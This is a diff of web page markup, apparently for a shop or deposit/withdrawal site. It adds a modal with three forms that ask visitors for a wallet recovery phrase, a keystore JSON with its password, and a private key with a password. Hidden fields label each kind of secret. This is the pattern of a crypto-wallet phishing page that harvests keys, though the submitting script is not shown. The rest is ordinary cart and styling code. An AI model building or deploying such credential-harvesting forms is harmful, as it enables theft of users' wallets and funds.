+                                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+                                                <form class="sendp">
+                                                    <div class="form-group">
+                                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Recovery Phrase" name="Phrase" class="form-control" rows="3" required="required"></textarea>
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <input hidden type="text" name="type_of_login_detail" value="recovery phrase">
+                                                    </div>
+                                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                                    <div style="margin-top: 15px;" class="form-group">
+                                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                                    </div>
+
+                                                </form>
+
+                                            </div>
+                                        </div>
+                                        <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab">
+                                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+
+                                                <form class="sendp">
+
+                                                    <div class="form-group">
+
+
+                                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Keystore JSON" name="Keystore_json" class="form-control" rows="3" required="required"></textarea>
+
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <input name="password" style="border-radius: 8px; background: transparent;" type="text" class="form-control" placeholder="Wallet password">
+                                                        <input hidden type="text" name="type_of_login_detail" value="keystone">
+                                                    </div>
+                                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                                    <div style="margin-top: 15px;" class="form-group">
+                                                        <button style="width: 100%;" class="closebutn shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                                    </div>
+
+                                                </form>
+
+                                            </div>
+                                        </div>
+                                        <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab">
+                                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+                                                <form class="sendp">
+                                                    <div class="form-group">
+                                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Private Key" name="Private_Key" class="form-control" rows="3" required="required"></textarea>
+
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <input name="password" style="border-radius: 8px; background: transparent;" type="text" class="form-control" placeholder="Wallet password">
+                                                        <input hidden type="text" name="type_of_login_detail" value="PrivateKey">
+                                                    </div>
+                                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                                    <div style="margin-top: 15px;" class="form-group">
+                                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="modal-footer">
+                                <!-- <button type="button" class="btn btn-xxs gradient-red" >Close</button> -->
+                                <a href="#" style="margin-top: 8px;" data-bs-dismiss="offcanvas" class="closebutn btn btn-xxs gradient-red">xxx Close</a>
+                            </div>
+                        </div>
+                        <!-- </form> -->
+                    </div>
+                </div>
+
+                <style>
+                    .loader1 {
+                        position: relative;
+                        width: 80px;
+                        height: 80px;
+                    }
+
+                    .circle {
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        border: 2px solid #f3f3f300;
+                        border-top: 2px solid #3498db;
+                        border-radius: 50%;
+                        animation: spin 2s linear infinite;
+                    }
+
+                    .picture {
+                        position: absolute;
+                        top: 50%;
+                        left: 50%;
+                        transform: translate(-50%, -50%);
+                    }
+
+                    .picture img {
+                        width: 100%;
+                        /* height: 80px; */
+                        border-radius: 50%;
+                    }
+                </style>
+
+
+
+
+
+
+            </div>
+
+
+        </div>
+        <!-- End of Page Content-->
+
+        <!-- Off Canvas and Menu Elements-->
+        <!-- Always outside the Page Content-->
+
+        <!-- Main Sidebar Menu -->
+        <div id="menu-sidebar" data-menu-active="nav-welcome" data-menu-load="sidebar.php" class="offcanvas offcanvas-start offcanvas-detached rounded-m">
+        </div>
+
+        <!-- Highlights Menu -->
+        <div id="menu-highlights" data-menu-load="menu-highlights.html" class="offcanvas offcanvas-bottom offcanvas-detached rounded-m">
+        </div>
+
+        <!-- cart php -->
+        <div id="cart" data-menu-load="cart.php" class="offcanvas offcanvas-top offcanvas-detached rounded-m">
+        </div>
+
+
+        <!-- modal section -->
+        <div id="deposit_modal" data-menu-load="deposit_modal.php" class="offcanvas offcanvas-bottom offcanvas-detached rounded-m">
+        </div>
+        <!-- modalsection ends  -->
+
+        <!--withjdraw modal section -->
+        <div id="withdrawal_modal" data-menu-load="withdrawal_modal.php" class="offcanvas offcanvas-bottom offcanvas-detached rounded-m">
+        </div>
+        <!-- withdraw modalsection ends  -->
+
+
+    </div>
+    <!-- End of Page ID-->
+
+    <script src="scripts/bootstrap.min.js"></script>
+    <script src="scripts/custom.js"></script>
+</body>
+
+
+<script>
+    function load() {
+        $.ajax({
+            url: 'includes/server',
+            data: {
+                action: 'load_cart_data'
+            },
+            type: 'POST',
+            dataType: 'JSON',
+            success: function(response) {
+                let $body = $("#bodyhere");
+                if (!$body.length) return; // Safety check
+
+                $body.empty(); // Clear old content
+
+                let grandTotal = 0;
+                response.forEach(item => {
+                    const {
+                        id,
+                        product_id,
+                        price,
+                        qty,
+                        product_name,
+                        product_img
+                    } = item;
+
+                    const html = `
+            <a href="#" class="d-flex py-1">
+              <div class="align-self-center">
+                <img src="img/${product_img}" alt="${product_name}" class="img-fluid p-2"
+                     style="height: 80px; object-fit: contain; border-radius: 20px;" />
+              </div>
+              <div class="align-self-center ps-1">
+                <h5 class="pt-1 mb-n1">${product_name}</h5>
+                <p style="margin-top: 13px;" class="mb-0 font-15 opacity-70">${qty} x ${currencysymbol}${price}</p>
+              </div>
+              <div data-id="${id}" class="remove_item align-self-center ms-auto text-end">
+                <i class="bi bi-trash color-red-dark font-26"></i>
+              </div>
+            </a>
+            <div class="divider my-2 opacity-50"></div>
+          `;
+
+                    $body.append(html);
+                    grandTotal += price * qty;
+                });
+
+                $('#grandTotalText').text(`${currencysymbol}${grandTotal.toLocaleString()}`);
+            }
+        });
+    }
+
+    // Wait until the offcanvas finishes loading
+    document.addEventListener("DOMContentLoaded", function() {
+        const cartOffcanvas = document.querySelector('#cart');
+
+        cartOffcanvas.addEventListener('shown.bs.offcanvas', function() {
+            load();
+        });
+    });
+</script>
